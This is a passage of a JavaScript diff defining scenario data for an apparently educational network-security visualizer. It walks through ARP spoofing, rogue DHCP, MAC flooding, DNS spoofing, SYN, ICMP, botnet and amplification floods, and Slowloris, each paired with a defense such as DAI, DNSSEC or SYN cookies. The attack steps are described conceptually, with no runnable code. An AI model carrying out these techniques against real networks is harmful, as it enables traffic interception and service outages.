+    tables:[{title:"ARP · Victim",cols:["IP","MAC","from"],rows:[["10.0.0.1",GM,"gateway ARP"]]},{title:"ARP · Gateway",cols:["IP","MAC","from"],rows:[["10.0.0.10",VM,"victim ARP"]]}]},
+   {title:"Attacker lies to the victim",narr:"The attacker sends a forged ARP reply: \"10.0.0.1 is at my MAC\". The victim trusts it without checking and overwrites the entry.",tag:"ARP spoofing · CAPEC-141",tagCls:"attack",compromised:["victim"],route:["attacker","switch","victim"],kind:"attack",
+    pkt:P("Forged ARP to victim",L("L2 · Ethernet",[["src",AM],["dst","FF:FF:FF:FF:FF:FF"],["type","0x0806 ARP"]]),L("L3 · ARP",[["op","2 (is-at)"],["sender IP","10.0.0.1"],["sender MAC",bad(AM)]])),
+    tables:[{title:"ARP · Victim",cols:["IP","MAC","from"],rows:[["10.0.0.1",bad(AM),"forged ARP"]]},{title:"ARP · Gateway",cols:["IP","MAC","from"],rows:[["10.0.0.10",VM,"victim ARP"]]}]},
+   {title:"Attacker lies to the gateway",narr:"Same trick aimed at the gateway: \"10.0.0.10 is at my MAC\". Now both sides think the attacker is their peer. A classic man-in-the-middle.",tag:"ARP spoofing · CAPEC-141",tagCls:"attack",compromised:["victim","gateway"],route:["attacker","switch","gateway"],kind:"attack",
+    pkt:P("Forged ARP to gateway",L("L2 · Ethernet",[["src",AM],["dst","FF:FF:FF:FF:FF:FF"],["type","0x0806 ARP"]]),L("L3 · ARP",[["op","2 (is-at)"],["sender IP","10.0.0.10"],["sender MAC",bad(AM)]])),
+    tables:[{title:"ARP · Victim",cols:["IP","MAC","from"],rows:[["10.0.0.1",bad(AM),"forged ARP"]]},{title:"ARP · Gateway",cols:["IP","MAC","from"],rows:[["10.0.0.10",bad(AM),"forged ARP"]]}]},
+   {title:"Traffic flows through the attacker",narr:"The victim browses again, but the poisoned table sends the packet to the attacker's MAC. He reads the traffic and forwards it on. The victim notices nothing.",tag:"MITM · interception",tagCls:"attack",compromised:["victim","gateway","attacker"],route:["victim","switch","attacker","switch","gateway","internet"],kind:"attack",
+    pkt:P("HTTPS to 8.8.8.8 (intercepted)",L("L2 · Ethernet",[["src",VM],["dst",bad(AM)],["type","0x0800 IPv4"]]),L("L3 · IPv4",[["src","10.0.0.10"],["dst","8.8.8.8"]]),L("L4 · TCP",[["dst port","443"]])),
+    tables:[{title:"ARP · Victim",cols:["IP","MAC","from"],rows:[["10.0.0.1",bad(AM),"forged ARP"]]},{title:"ARP · Gateway",cols:["IP","MAC","from"],rows:[["10.0.0.10",bad(AM),"forged ARP"]]}]},
+  ],
+  defend:[
+   {title:"Normal traffic",narr:"Same as before, but the switch now runs Dynamic ARP Inspection (DAI) with IP↔MAC bindings from DHCP snooping.",tag:"defense on",tagCls:"safe",compromised:[],route:["victim","switch","gateway","internet"],kind:"normal",
+    pkt:P("HTTPS to 8.8.8.8",L("L2 · Ethernet",[["src",VM],["dst",GM]]),L("L3 · IPv4",[["dst","8.8.8.8"]])),
+    tables:[{title:"ARP · Victim",cols:["IP","MAC","from"],rows:[["10.0.0.1",GM,"gateway ARP"]]}],hint:"IP↔MAC bindings are trusted only on legitimate ports."},
+   {title:"Forged ARP rejected",narr:"The attacker sends the same forged ARP. The switch checks it against the binding table: 10.0.0.1 is not on this port — the packet is dropped.",tag:"DAI: drop",tagCls:"safe",compromised:[],route:["attacker","switch"],kind:"blocked",
+    pkt:P("Forged ARP (blocked)",L("L2 · Ethernet",[["src",AM],["dst","FF:FF:FF:FF:FF:FF"]]),L("L3 · ARP",[["sender IP","10.0.0.1"],["sender MAC",bad(AM)]])),
+    tables:[{title:"ARP · Victim",cols:["IP","MAC","from"],rows:[["10.0.0.1",GM,"gateway ARP"]]}]},
+   {title:"Tables stay clean",narr:"The ARP tables never changed — the real MACs are intact. Traffic goes straight through the gateway. The MITM failed.",tag:"attack failed",tagCls:"safe",compromised:[],route:["victim","switch","gateway","internet"],kind:"normal",
+    pkt:P("HTTPS to 8.8.8.8",L("L2 · Ethernet",[["src",VM],["dst",GM]])),
+    tables:[{title:"ARP · Victim",cols:["IP","MAC","from"],rows:[["10.0.0.1",GM,"gateway ARP"]]}]},
+  ]},
+
+ dhcp:{ name:"DHCP starvation + rogue",
+  nodes:{ victim:N(150,110,"Client","requests IP","pc"), attacker:N(150,330,"Attacker","10.0.0.66","attacker"),
+          switch:N(420,220,"Switch","L2","switch",-30), dhcp:N(660,110,"DHCP","10.0.0.2","server"), gateway:N(660,330,"Gateway","10.0.0.1","router",-32), internet:N(882,220,"Internet","8.8.8.8","cloud",-34) },
+  links:[["victim","switch"],["attacker","switch"],["switch","dhcp"],["switch","gateway"],["gateway","internet"]],
+  attack:[
+   {title:"Normal address lease",narr:"The client boots and asks for an address. The real DHCP (10.0.0.2) hands out an IP and the real gateway 10.0.0.1.",tag:"normal",tagCls:"",compromised:[],route:["victim","switch","dhcp"],kind:"normal",
+    pkt:P("DHCP DISCOVER",L("L2 · Ethernet",[["src",VM],["dst","FF:FF:FF:FF:FF:FF"]]),L("L4 · UDP",[["src","68"],["dst","67"]]),L("DHCP",[["msg","DISCOVER"]])),
+    tables:[{title:"DHCP pool",cols:["range","free"],rows:[["10.0.0.10–250","240"]]},{title:"Client config",cols:["param","value"],rows:[["gateway","10.0.0.1"]]}]},
+   {title:"Starvation: pool drained",narr:"The attacker floods thousands of DISCOVERs with random MACs. The server leases every address to these fake clients — none are left.",tag:"DHCP starvation · CAPEC-125",tagCls:"attack",compromised:["dhcp"],route:["attacker","switch","dhcp"],kind:"attack",flood:true,count:16,
+    pkt:P("DHCP DISCOVER ×1000",L("L2 · Ethernet",[["src",bad("random MAC")],["dst","FF:FF:FF:FF:FF:FF"]]),L("L4 · UDP",[["dst","67"]]),L("DHCP",[["msg","DISCOVER"],["MAC","random"]])),
+    tables:[{title:"DHCP pool",cols:["range","free"],rows:[["10.0.0.10–250",bad("0")]]},{title:"Client config",cols:["param","value"],rows:[["gateway","10.0.0.1"]]}]},
+   {title:"Rogue DHCP takes over",narr:"A new client asks for an address. The real server is empty and silent, so the attacker answers with his own DHCP and hands out his address 10.0.0.66 as the gateway.",tag:"rogue DHCP",tagCls:"attack",compromised:["dhcp","victim"],route:["attacker","switch","victim"],kind:"attack",
+    pkt:P("Rogue DHCP OFFER",L("L4 · UDP",[["src","67"],["dst","68"]]),L("DHCP",[["msg","OFFER"],["client IP","10.0.0.80"],["gateway",bad("10.0.0.66")]])),
+    tables:[{title:"DHCP pool",cols:["range","free"],rows:[["10.0.0.10–250",bad("0")]]},{title:"Client config",cols:["param","value"],rows:[["gateway",bad("10.0.0.66")]]}]},
+   {title:"Traffic flows through the attacker",narr:"The client treats the attacker as its gateway and sends all traffic to him. He reads and forwards it — man-in-the-middle again, this time via rogue DHCP.",tag:"MITM",tagCls:"attack",compromised:["dhcp","victim","attacker"],route:["victim","switch","attacker","switch","gateway","internet"],kind:"attack",
+    pkt:P("HTTPS via rogue gateway",L("L3 · IPv4",[["src","10.0.0.80"],["dst","8.8.8.8"]]),L("L4 · TCP",[["dst port","443"]])),
+    tables:[{title:"Client config",cols:["param","value"],rows:[["gateway",bad("10.0.0.66")]]}]},
+  ],
+  defend:[
+   {title:"Normal address lease",narr:"DHCP snooping: the real server's port is marked trusted, the others are not. The client gets its address as usual.",tag:"defense on",tagCls:"safe",compromised:[],route:["victim","switch","dhcp"],kind:"normal",
+    pkt:P("DHCP DISCOVER",L("L4 · UDP",[["dst","67"]]),L("DHCP",[["msg","DISCOVER"]])),
+    tables:[{title:"Ports",cols:["port","trust"],rows:[["to DHCP","trusted"],["to attacker","no"]]}],hint:"DHCP replies are accepted only from a trusted port."},
+   {title:"Rogue DHCP blocked",narr:"The attacker tries to answer with his own DHCP OFFER, but it arrives on an untrusted port. The switch drops it.",tag:"snooping: drop",tagCls:"safe",compromised:[],route:["attacker","switch"],kind:"blocked",
+    pkt:P("Rogue DHCP OFFER (blocked)",L("L4 · UDP",[["src","67"]]),L("DHCP",[["msg","OFFER"],["gateway",bad("10.0.0.66")]])),
+    tables:[{title:"Ports",cols:["port","trust"],rows:[["to attacker","no → drop"]]}]},
+   {title:"Client got the real gateway",narr:"The client is configured with the real gateway 10.0.0.1 and traffic goes straight through. The hijack failed.",tag:"attack failed",tagCls:"safe",compromised:[],route:["victim","switch","gateway","internet"],kind:"normal",
+    pkt:P("HTTPS to 8.8.8.8",L("L3 · IPv4",[["dst","8.8.8.8"]])),
+    tables:[{title:"Client config",cols:["param","value"],rows:[["gateway","10.0.0.1"]]}]},
+  ]},
+
+ mac:{ name:"MAC flooding (CAM)",
+  nodes:{ victim:N(150,110,"Victim","10.0.0.10","pc"), attacker:N(150,330,"Attacker","10.0.0.66","attacker"),
+          switch:N(430,220,"Switch","CAM table","switch",-30), gateway:N(690,220,"Gateway","10.0.0.1","router",-32), internet:N(882,220,"Internet","8.8.8.8","cloud",-34) },
+  links:[["victim","switch"],["attacker","switch"],["switch","gateway"],["gateway","internet"]],
+  attack:[
+   {title:"Normal switching",narr:"The switch knows which MAC is on which port. A frame from the victim to the gateway goes only to the right port — the attacker can't see it.",tag:"normal",tagCls:"",compromised:[],route:["victim","switch","gateway"],kind:"normal",
+    pkt:P("Frame victim→gateway",L("L2 · Ethernet",[["src",VM],["dst",GM]]),L("L3 · IPv4",[["dst","8.8.8.8"]])),
+    tables:[{title:"CAM table",cols:["MAC","port"],rows:[[VM,"1"],[GM,"3"]]}]},
+   {title:"Flood: CAM overflows",narr:"The attacker floods frames with random source MACs. The switch's table is limited and fills up with junk.",tag:"MAC flooding · CAPEC-127",tagCls:"attack",compromised:["switch"],route:["attacker","switch"],kind:"attack",flood:true,count:18,
+    pkt:P("Frame with random MAC ×∞",L("L2 · Ethernet",[["src",bad("random")],["dst",bad("random")]])),
+    tables:[{title:"CAM table",cols:["MAC","port"],rows:[[bad("random ×8192"),"2"],["…","overflowed"]]}]},
+   {title:"Fail-open: switch acts as a hub",narr:"With no room in the table the switch no longer knows where to send frames, so it floods them to every port. The victim's traffic is now copied to the attacker too — he sniffs everything.",tag:"traffic interception",tagCls:"attack",compromised:["switch","attacker"],route:["victim","switch","attacker"],kind:"attack",
+    pkt:P("Copy of victim's frame to attacker",L("L2 · Ethernet",[["src",VM],["dst",GM]]),L("L4 · TCP",[["payload","visible to attacker"]])),
+    tables:[{title:"CAM table",cols:["MAC","port"],rows:[["overflowed","flood to all ports"]]}]},
+  ],
+  defend:[
+   {title:"Normal switching",narr:"Port security is enabled: each port allows only a limited number of MAC addresses.",tag:"defense on",tagCls:"safe",compromised:[],route:["victim","switch","gateway"],kind:"normal",
+    pkt:P("Frame victim→gateway",L("L2 · Ethernet",[["src",VM],["dst",GM]])),
+    tables:[{title:"Port security",cols:["port","max MAC"],rows:[["to attacker","1"]]}],hint:"Extra MACs on a port → the port is shut down."},
+   {title:"Flood blocked",narr:"As soon as a second MAC appears on the attacker's port, port security is violated and the port is disabled (err-disabled). The flood stops.",tag:"port security: shutdown",tagCls:"safe",compromised:[],route:["attacker","switch"],kind:"blocked",flood:true,count:18,
+    pkt:P("Frame with random MAC (blocked)",L("L2 · Ethernet",[["src",bad("2nd MAC")]])),
+    tables:[{title:"Port security",cols:["port","status"],rows:[["to attacker",bad("err-disabled")]]}]},
+   {title:"CAM intact, no sniffing",narr:"The switch table never overflows, so the victim's frames go only to the gateway port. The attacker sees none of the traffic.",tag:"attack failed",tagCls:"safe",compromised:[],route:["victim","switch","gateway"],kind:"normal",
+    pkt:P("Frame victim→gateway",L("L2 · Ethernet",[["src",VM],["dst",GM]])),
+    tables:[{title:"CAM table",cols:["MAC","port"],rows:[[VM,"1"],[GM,"3"]]}]},
+  ]},
+
+ dns:{ name:"DNS spoofing",
+  nodes:{ victim:N(150,110,"Victim","10.0.0.10","pc"), attacker:N(150,330,"Attacker","10.0.0.66","attacker"),
+          switch:N(420,220,"Switch","L2","switch",-30), dns:N(660,110,"DNS","10.0.0.53","server"), gateway:N(660,330,"Gateway","10.0.0.1","router",-32), bank:N(882,330,"bank.example","203.0.113.9","server") },
+  links:[["victim","switch"],["attacker","switch"],["switch","dns"],["switch","gateway"],["gateway","bank"]],
+  attack:[
+   {title:"Normal name resolution",narr:"The victim asks DNS for bank.example. The real server replies with the correct IP 203.0.113.9 and the victim reaches the real bank.",tag:"normal",tagCls:"",compromised:[],route:["victim","switch","dns"],kind:"normal",
+    pkt:P("DNS reply",L("L4 · UDP",[["src","53"]]),L("DNS",[["question","bank.example"],["answer","203.0.113.9"]])),
+    tables:[{title:"Victim DNS cache",cols:["domain","IP"],rows:[["bank.example","203.0.113.9"]]}]},
+   {title:"Race of forged replies",narr:"The victim sends a query, and the attacker floods forged DNS replies with the right ID, substituting his own IP. His reply arrives before the real one.",tag:"DNS spoofing · CAPEC-142",tagCls:"attack",compromised:["victim"],route:["attacker","switch","victim"],kind:"attack",flood:true,count:14,
+    pkt:P("Forged DNS reply",L("L4 · UDP",[["src","53"]]),L("DNS",[["question","bank.example"],["answer",bad("10.0.0.66")],["txid","guessed"]])),
+    tables:[{title:"Victim DNS cache",cols:["domain","IP"],rows:[["bank.example",bad("10.0.0.66")]]}]},
+   {title:"Victim goes to the attacker",narr:"In the victim's cache bank.example now points to the attacker. The browser opens his fake site instead of the bank — phishing.",tag:"redirection",tagCls:"attack",compromised:["victim","attacker"],route:["victim","switch","attacker"],kind:"attack",
+    pkt:P("HTTPS to bank.example",L("L3 · IPv4",[["dst",bad("10.0.0.66")]]),L("L4 · TCP",[["dst port","443"]])),
+    tables:[{title:"Victim DNS cache",cols:["domain","IP"],rows:[["bank.example",bad("10.0.0.66")]]}]},
+  ],
+  defend:[
+   {title:"Normal name resolution",narr:"DNSSEC is on: zone records are signed and the resolver verifies the signature on every reply.",tag:"defense on",tagCls:"safe",compromised:[],route:["victim","switch","dns"],kind:"normal",
+    pkt:P("DNS reply (signed)",L("DNS",[["answer","203.0.113.9"],["RRSIG","valid"]])),
+    tables:[{title:"Victim DNS cache",cols:["domain","IP"],rows:[["bank.example","203.0.113.9"]]}],hint:"A reply without a valid signature is not accepted."},
+   {title:"Forged reply rejected",narr:"The attacker sends a forged reply, but he can't forge the zone signature. The resolver discards it as untrusted.",tag:"DNSSEC: invalid",tagCls:"safe",compromised:[],route:["attacker","switch","victim"],kind:"blocked",flood:true,count:14,
+    pkt:P("Forged DNS reply (rejected)",L("DNS",[["answer",bad("10.0.0.66")],["RRSIG",bad("missing / invalid")]])),
+    tables:[{title:"Victim DNS cache",cols:["domain","IP"],rows:[["bank.example","203.0.113.9"]]}]},
+   {title:"Victim reaches the real bank",narr:"The cache keeps the authentic IP and the browser opens the real bank.example. The spoof failed.",tag:"attack failed",tagCls:"safe",compromised:[],route:["victim","switch","gateway","bank"],kind:"normal",
+    pkt:P("HTTPS to bank.example",L("L3 · IPv4",[["dst","203.0.113.9"]])),
+    tables:[{title:"Victim DNS cache",cols:["domain","IP"],rows:[["bank.example","203.0.113.9"]]}]},
+  ]},
+
+ syn:{ name:"SYN flood (DoS)",
+  nodes:{ victim:N(150,110,"User","10.0.0.10","pc"), attacker:N(150,330,"Attacker","spoofed IP","attacker"),
+          switch:N(430,220,"Switch","L2","switch",-30), gateway:N(660,220,"Gateway","10.0.0.1","router",-32), server:N(882,220,"Web server","203.0.113.5","server") },
+  links:[["victim","switch"],["attacker","switch"],["switch","gateway"],["gateway","server"]],
+  attack:[
+   {title:"Normal connection",narr:"The user opens the site: a three-way handshake SYN → SYN-ACK → ACK. The server's half-open queue has room.",tag:"normal",tagCls:"",compromised:[],route:["victim","switch","gateway","server"],kind:"normal",
+    pkt:P("TCP SYN",L("L3 · IPv4",[["src","10.0.0.10"],["dst","203.0.113.5"]]),L("L4 · TCP",[["flags","SYN"],["dst port","443"]])),
+    tables:[{title:"Server queue",cols:["half-open","limit"],rows:[["1","128"]]}]},
+   {title:"SYN storm from spoofed IPs",narr:"The attacker sends a storm of SYNs from forged addresses and never completes the handshake. Each one takes a slot in the queue and holds it.",tag:"SYN flood · CAPEC-482",tagCls:"attack",compromised:["server"],route:["attacker","switch","gateway","server"],kind:"attack",flood:true,count:20,
+    pkt:P("TCP SYN ×flood",L("L3 · IPv4",[["src",bad("random IP")],["dst","203.0.113.5"]]),L("L4 · TCP",[["flags","SYN"],["ACK",bad("never comes")]])),
+    tables:[{title:"Server queue",cols:["half-open","limit"],rows:[[bad("128"),"128"]]}]},
+   {title:"Legitimate user denied",narr:"The queue is full. When a real user sends a SYN, the server can no longer accept the connection — the site is unreachable for them.",tag:"denial of service",tagCls:"attack",compromised:["server"],route:["victim","switch","gateway","server"],kind:"attack",
+    pkt:P("TCP SYN (dropped)",L("L3 · IPv4",[["src","10.0.0.10"],["dst","203.0.113.5"]]),L("L4 · TCP",[["flags","SYN"],["reply",bad("no room")]])),
+    tables:[{title:"Server queue",cols:["half-open","limit"],rows:[[bad("128"),"128"]]}]},
+  ],
+  defend:[
+   {title:"Normal connection",narr:"The server runs SYN cookies: no state is allocated until the handshake is completed with a real ACK.",tag:"defense on",tagCls:"safe",compromised:[],route:["victim","switch","gateway","server"],kind:"normal",
+    pkt:P("TCP SYN",L("L4 · TCP",[["flags","SYN"],["dst port","443"]])),
+    tables:[{title:"Server queue",cols:["allocated","method"],rows:[["0","SYN cookies"]]}],hint:"Connection parameters are encoded in the reply, not held in a queue."},
+   {title:"SYN storm holds no state",narr:"The attacker sends the same storm of SYNs, but the server reserves nothing for each one. The queue never fills.",tag:"SYN cookies: ok",tagCls:"safe",compromised:[],route:["attacker","switch","gateway","server"],kind:"blocked",flood:true,count:20,
+    pkt:P("TCP SYN ×flood (no effect)",L("L3 · IPv4",[["src",bad("random IP")]]),L("L4 · TCP",[["flags","SYN"]])),
+    tables:[{title:"Server queue",cols:["allocated","method"],rows:[["0","SYN cookies"]]}]},
+   {title:"Legitimate user connects",narr:"The real user completes the handshake and opens the site normally. The attack caused no outage.",tag:"attack failed",tagCls:"safe",compromised:[],route:["victim","switch","gateway","server"],kind:"normal",
+    pkt:P("TCP ACK",L("L4 · TCP",[["flags","ACK"],["dst port","443"]])),
+    tables:[{title:"Server queue",cols:["active","method"],rows:[["1","SYN cookies"]]}]},
+  ]},
+
+ icmp:{ name:"ICMP flood (ping)",
+  nodes:{ victim:N(150,110,"Host","10.0.0.10","pc"), attacker:N(150,330,"Attacker","10.0.0.66","attacker"),
+          switch:N(430,220,"Switch","L2","switch",-30), gateway:N(690,220,"Gateway","10.0.0.1","router",-32), internet:N(882,220,"Internet","8.8.8.8","cloud",-34) },
+  links:[["victim","switch"],["attacker","switch"],["switch","gateway"],["gateway","internet"]],
+  attack:[
+   {title:"Normal ping",narr:"A single ICMP echo request and reply — a connectivity check. The host answers instantly and stays free for work.",tag:"normal",tagCls:"",compromised:[],route:["attacker","switch","victim"],kind:"normal",
+    pkt:P("ICMP echo",L("L3 · IPv4",[["dst","10.0.0.10"]]),L("ICMP",[["type","8 (echo request)"]])),
+    tables:[{title:"Host",cols:["ICMP/s","load"],rows:[["1","0%"]]}]},
+   {title:"Flood of echo requests",narr:"The attacker sends a storm of ICMP echo requests. The host must reply to each one and chokes, while the link fills up.",tag:"ICMP flood · CAPEC-125",tagCls:"attack",compromised:["victim"],route:["attacker","switch","victim"],kind:"attack",flood:true,count:20,
+    pkt:P("ICMP echo ×flood",L("L3 · IPv4",[["src",bad("often spoofed")],["dst","10.0.0.10"]]),L("ICMP",[["type","8 ×∞"]])),
+    tables:[{title:"Host",cols:["ICMP/s","load"],rows:[[bad("500 000"),bad("100%")]]}]},
+   {title:"Host stops responding",narr:"CPU and link are busy handling the flood. Useful traffic to the host stalls — it is effectively unreachable.",tag:"denial of service",tagCls:"attack",compromised:["victim"],route:["victim","switch","gateway"],kind:"attack",
+    pkt:P("Useful traffic (stalls)",L("L3 · IPv4",[["src","10.0.0.10"]]),L("L4 · TCP",[["reply",bad("delayed")]])),
+    tables:[{title:"Host",cols:["ICMP/s","load"],rows:[[bad("500 000"),bad("100%")]]}]},
+  ],
+  defend:[
+   {title:"Normal ping",narr:"The firewall rate-limits ICMP: normal diagnostics work, bursts are trimmed.",tag:"defense on",tagCls:"safe",compromised:[],route:["attacker","switch","victim"],kind:"normal",
+    pkt:P("ICMP echo",L("ICMP",[["type","8"]])),
+    tables:[{title:"Firewall",cols:["rule","ICMP"],rows:[["rate-limit","100/s"]]}],hint:"Above the threshold echo requests are dropped."},
+   {title:"Flood trimmed by the limit",narr:"The echo request storm exceeds the limit and the firewall drops everything over it, never reaching the host.",tag:"rate-limit: drop",tagCls:"safe",compromised:[],route:["attacker","switch"],kind:"blocked",flood:true,count:20,
+    pkt:P("ICMP echo (dropped)",L("ICMP",[["type","8"],["verdict",bad("drop")]])),
+    tables:[{title:"Host",cols:["ICMP/s","load"],rows:[["100","4%"]]}]},
+   {title:"Host keeps working",narr:"The host's load stays normal and useful traffic passes freely. The flood caused no outage.",tag:"attack mitigated",tagCls:"safe",compromised:[],route:["victim","switch","gateway"],kind:"normal",
+    pkt:P("Useful traffic",L("L4 · TCP",[["reply","ok"]])),
+    tables:[{title:"Host",cols:["ICMP/s","load"],rows:[["100","4%"]]}]},
+  ]},
+
+ ddos:{ name:"DDoS — botnet",
+  nodes:{ botnet:N(150,110,"Botnet","10,000 nodes","attacker"), user:N(150,330,"User","client","pc"),
+          internet:N(410,220,"Internet","","cloud",-34), gateway:N(660,220,"Gateway","edge","router",-32), server:N(882,220,"Web server","203.0.113.5","server") },
+  links:[["botnet","internet"],["user","internet"],["internet","gateway"],["gateway","server"]],
+  attack:[
+   {title:"Normal load",narr:"Users open the site and the server handles the usual number of requests easily.",tag:"normal",tagCls:"",compromised:[],route:["user","internet","gateway","server"],kind:"normal",
+    pkt:P("HTTPS request",L("L3 · IPv4",[["src","client"],["dst","203.0.113.5"]]),L("L7 · HTTP",[["GET","/"]])),
+    tables:[{title:"Server load",cols:["req/s","limit"],rows:[["50","~10 000"]]}]},
+   {title:"Botnet floods the server",narr:"Tens of thousands of infected devices hit the server at once. The traffic volume is orders of magnitude above its capacity.",tag:"DDoS · CAPEC-488",tagCls:"attack",compromised:["server"],route:["botnet","internet","gateway","server"],kind:"attack",flood:true,count:24,
+    pkt:P("HTTP flood ×millions",L("L3 · IPv4",[["src",bad("thousands of IPs")],["dst","203.0.113.5"]]),L("L7 · HTTP",[["GET","/ ×∞"]])),
+    tables:[{title:"Server load",cols:["req/s","limit"],rows:[[bad("2,000,000"),"~10 000"]]}]},
+   {title:"Site is down",narr:"The link and the server are saturated with junk traffic. A real user's request is lost in the flood — the site won't open.",tag:"denial of service",tagCls:"attack",compromised:["server"],route:["user","internet","gateway","server"],kind:"attack",
+    pkt:P("HTTPS request (lost)",L("L3 · IPv4",[["src","client"],["dst","203.0.113.5"]]),L("L7 · HTTP",[["reply",bad("timeout")]])),
+    tables:[{title:"Server load",cols:["req/s","limit"],rows:[[bad("2,000,000"),"~10 000"]]}]},
+  ],
+  defend:[
+   {title:"Normal load",narr:"Traffic goes through a cloud defense (CDN / scrubbing) with request limits at the network edge.",tag:"defense on",tagCls:"safe",compromised:[],route:["user","internet","gateway","server"],kind:"normal",
+    pkt:P("HTTPS request",L("L7 · HTTP",[["GET","/"]])),
+    tables:[{title:"Edge",cols:["filter","status"],rows:[["rate-limit","on"]]}],hint:"Abnormal volume is cut off before the server."},
+   {title:"Flood scrubbed at the edge",narr:"The scrubbing cloud absorbs the hit: the botnet's junk traffic is recognized and dropped, and only clean traffic reaches the server.",tag:"scrubbing: filtered",tagCls:"safe",compromised:[],route:["botnet","internet","gateway"],kind:"blocked",flood:true,count:24,
+    pkt:P("HTTP flood (filtered)",L("L3 · IPv4",[["src",bad("thousands of IPs")]]),L("L7 · HTTP",[["verdict",bad("drop")]])),
+    tables:[{title:"Edge",cols:["scrubbed","passed"],rows:[[bad("99.9%"),"clean traffic"]]}]},
+   {title:"Site stays up",narr:"The user opens the site as usual: legitimate requests passed the filter and reached the server.",tag:"attack mitigated",tagCls:"safe",compromised:[],route:["user","internet","gateway","server"],kind:"normal",
+    pkt:P("HTTPS request",L("L7 · HTTP",[["reply","200 OK"]])),
+    tables:[{title:"Server load",cols:["req/s","limit"],rows:[["60","~10 000"]]}]},
+  ]},
+
+ ampl:{ name:"DNS amplification",
+  nodes:{ attacker:N(150,230,"Attacker","spoofs victim IP","attacker"), internet:N(500,230,"Internet","","cloud",-34),
+          resolver:N(772,110,"Open DNS","resolvers","server"), victim:N(772,350,"Victim","203.0.113.7","server") },
+  links:[["attacker","internet"],["internet","resolver"],["internet","victim"]],
+  attack:[
+   {title:"Tiny queries with a spoofed IP",narr:"The attacker sends open DNS resolvers small queries, but puts the victim's IP in the \"sender\" field instead of his own.",tag:"spoofing · CAPEC-486",tagCls:"attack",compromised:[],route:["attacker","internet","resolver"],kind:"attack",flood:true,count:16,
+    pkt:P("DNS query (60 bytes)",L("L3 · IPv4",[["src",bad("203.0.113.7 (victim)")],["dst","resolver"]]),L("DNS",[["question","ANY example.com"]])),
+    tables:[{title:"Amplification",cols:["query","reply"],rows:[["60 B","~3000 B (×50)"]]}]},
+   {title:"Resolvers flood the victim",narr:"Each resolver sends a large reply to the spoofed address — the victim. A tiny query turns into a reply tens of times bigger.",tag:"DNS amplification",tagCls:"attack",compromised:["victim"],route:["resolver","internet","victim"],kind:"attack",flood:true,count:24,
+    pkt:P("DNS reply (3000 bytes)",L("L3 · IPv4",[["src","resolver"],["dst",bad("203.0.113.7")]]),L("DNS",[["answer","huge ANY record"]])),
+    tables:[{title:"Victim link",cols:["inbound","capacity"],rows:[[bad("40 Gbit/s"),"1 Gbit/s"]]}]},
+   {title:"Victim overwhelmed",narr:"The victim receives a massive flood of replies it never asked for. Its link is saturated — denial of service.",tag:"reflected DDoS",tagCls:"attack",compromised:["victim"],route:["resolver","internet","victim"],kind:"attack",flood:true,count:24,
+    pkt:P("DNS reply ×storm",L("L3 · IPv4",[["dst",bad("203.0.113.7")]]),L("DNS",[["answer","ANY"]])),
+    tables:[{title:"Victim link",cols:["inbound","capacity"],rows:[[bad("40 Gbit/s"),"1 Gbit/s"]]}]},
+  ],
+  defend:[
+   {title:"Source validation on the network",narr:"The attacker's ISP runs source filtering (BCP38): a packet with a foreign return address is not allowed out of the network.",tag:"defense on",tagCls:"safe",compromised:[],route:["attacker","internet"],kind:"blocked",flood:true,count:16,
+    pkt:P("Spoofed DNS query (drop)",L("L3 · IPv4",[["src",bad("203.0.113.7")],["verdict",bad("not from this network → drop")]])),
+    tables:[{title:"Ingress filter",cols:["check","result"],rows:[["src ≠ network",bad("dropped")]]}],hint:"Without a spoofed source, reflection is impossible."},
+   {title:"Resolvers are closed",narr:"The open resolvers are set to answer only their own clients, so they ignore arbitrary queries.",tag:"closed resolver",tagCls:"safe",compromised:[],route:["attacker","internet","resolver"],kind:"blocked",flood:true,count:16,
+    pkt:P("DNS query (refused)",L("DNS",[["question","ANY"],["answer",bad("refused")]])),
+    tables:[{title:"Resolver",cols:["access","to strangers"],rows:[["recursion",bad("denied")]]}]},
+   {title:"Victim is quiet",narr:"No flood of replies reaches the victim: the source is filtered and the resolvers are closed. Amplification never happened.",tag:"attack failed",tagCls:"safe",compromised:[],route:["internet","victim"],kind:"normal",
+    pkt:P("Normal traffic",L("L3 · IPv4",[["dst","203.0.113.7"]])),
+    tables:[{title:"Victim link",cols:["inbound","capacity"],rows:[["0.2 Gbit/s","1 Gbit/s"]]}]},
+  ]},
+
+ slow:{ name:"Slowloris",
+  nodes:{ user:N(150,110,"User","client","pc"), attacker:N(150,330,"Attacker","10.0.0.66","attacker"),
+          gateway:N(500,220,"Gateway","","router",-32), server:N(820,220,"Web server","pool 256","server") },
+  links:[["user","gateway"],["attacker","gateway"],["gateway","server"]],
+  attack:[
+   {title:"Normal request",narr:"The user opens a connection, quickly sends a full request and frees the slot. The connection pool is nearly empty.",tag:"normal",tagCls:"",compromised:[],route:["user","gateway","server"],kind:"normal",
+    pkt:P("HTTP request (complete)",L("L4 · TCP",[["dst port","443"]]),L("L7 · HTTP",[["GET","/ HTTP/1.1"],["status","complete"]])),
+    tables:[{title:"Connection pool",cols:["used","total"],rows:[["3","256"]]}]},
+   {title:"Slow half-open connections",narr:"The attacker opens hundreds of connections and sends headers one byte at a time, never finishing the request. Each hanging connection holds a slot.",tag:"Slowloris · CAPEC-469",tagCls:"attack",compromised:["server"],route:["attacker","gateway","server"],kind:"attack",flood:true,count:12,
+    pkt:P("HTTP header, one byte at a time",L("L7 · HTTP",[["GET","/ HTTP/1.1"],["header",bad("…1 byte at a time, never ends")]])),
+    tables:[{title:"Connection pool",cols:["used","total"],rows:[[bad("256"),"256"]]}]},
+   {title:"No free slots",narr:"The whole pool is held by the attacker's hanging connections. A new user has nowhere to connect — the site is down. Little traffic, but the server is on its knees.",tag:"denial of service",tagCls:"attack",compromised:["server"],route:["user","gateway","server"],kind:"attack",
+    pkt:P("HTTP request (no slot)",L("L7 · HTTP",[["reply",bad("no free connections")]])),
+    tables:[{title:"Connection pool",cols:["used","total"],rows:[[bad("256"),"256"]]}]},
+  ],
+  defend:[
+   {title:"Normal request",narr:"A reverse proxy sits in front of the server with a timeout on slow connections and a per-IP limit.",tag:"defense on",tagCls:"safe",compromised:[],route:["user","gateway","server"],kind:"normal",
+    pkt:P("HTTP request",L("L7 · HTTP",[["GET","/"]])),
+    tables:[{title:"Proxy",cols:["rule","value"],rows:[["header timeout","10 s"],["conn/IP","20"]]}],hint:"A client that's too slow gets disconnected."},
